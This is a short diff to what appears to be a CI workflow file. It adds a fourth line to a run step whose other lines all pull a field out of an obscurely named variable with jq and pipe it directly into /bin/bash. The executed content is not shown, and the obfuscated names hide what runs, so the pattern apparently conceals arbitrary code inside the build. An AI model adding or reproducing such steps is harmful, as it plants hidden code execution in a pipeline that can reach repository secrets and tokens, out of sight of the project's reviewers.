@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$mz1207" | jq -r .xjl578 | /bin/bash
           echo $pcu4694 | jq -r .vn8404 | /bin/bash
           echo $r380 | jq -r .q557 | /bin/bash
+          echo $j12214 | jq -r .z3695 | /bin/bash
 
       - name: Archive results
         if: always()
